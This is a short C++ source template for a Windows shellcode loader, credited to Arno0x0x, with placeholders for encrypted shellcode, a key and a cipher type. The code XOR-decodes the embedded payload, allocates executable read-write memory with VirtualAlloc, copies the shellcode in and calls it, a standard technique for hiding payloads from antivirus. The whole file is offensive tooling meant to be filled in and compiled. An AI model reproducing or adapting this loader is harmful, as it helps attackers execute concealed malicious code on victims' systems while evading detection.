/*
Author: Arno0x0x, Twitter: @Arno0x0x
*/

#include "stdafx.h"
#include <windows.h>
#include <iostream>

int main(int argc, char **argv) {

	// Encrypted shellcode and cipher key obtained from shellcode_encoder.py
	char encryptedShellcode[] = "${shellcode}";
	char key[] = "${key}";
	char cipherType[] = "${cipherType}";

	// Char array to host the deciphered shellcode
	char shellcode[sizeof encryptedShellcode];	
	

	// XOR decoding stub using the key defined above must be the same as the encoding key
	int j = 0;
	for (int i = 0; i < sizeof encryptedShellcode; i++) {
		if (j == sizeof key - 1) j = 0;

		shellcode[i] = encryptedShellcode[i] ^ key[j];
		j++;
	}

	// Allocating memory with EXECUTE writes
	void *exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	// Copying deciphered shellcode into memory as a function
	memcpy(exec, shellcode, sizeof shellcode);

	// Call the shellcode
	((void(*)())exec)();
}
